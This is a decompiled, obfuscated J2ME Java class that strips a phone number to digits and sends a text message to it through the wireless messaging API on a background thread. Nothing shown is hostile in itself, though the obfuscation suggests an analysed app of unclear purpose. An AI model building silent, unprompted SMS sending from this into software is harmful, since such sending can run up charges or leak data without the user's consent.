import javax.microedition.io.Connection;
import javax.wireless.messaging.Message;
import javax.microedition.io.Connector;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

// 
// Decompiled by Procyon v0.5.36
// 

class e implements Runnable
{
    private String I;
    private String Code;
    
    public e(String string, final String i) {
        final StringBuffer sb = new StringBuffer();
        if (string != null) {
            for (int j = 0; j < string.length(); ++j) {
                if (Character.isDigit(string.charAt(j)) || (string.charAt(j) == '+' && j == 0)) {
                    sb.append(string.charAt(j));
                }
            }
        }
        string = sb.toString();
        this.Code = "sms://" + string;
        this.I = i;
    }
    
    public final void Code() {
        d.Code(this);
    }
    
    public void run() {
        Connection connection = null;
        final String code = this.Code;
        try {
            final TextMessage textMessage;
            (textMessage = (TextMessage)((MessageConnection)(connection = Connector.open(code))).newMessage("text")).setPayloadText(this.I);
            ((MessageConnection)connection).send((Message)textMessage);
            Code.Code("SMS", d.Code(71));
        }
        catch (Exception ex) {
            Code.Code("SMS", d.Code(55));
        }
        finally {
            d.Code(connection);
        }
    }
}
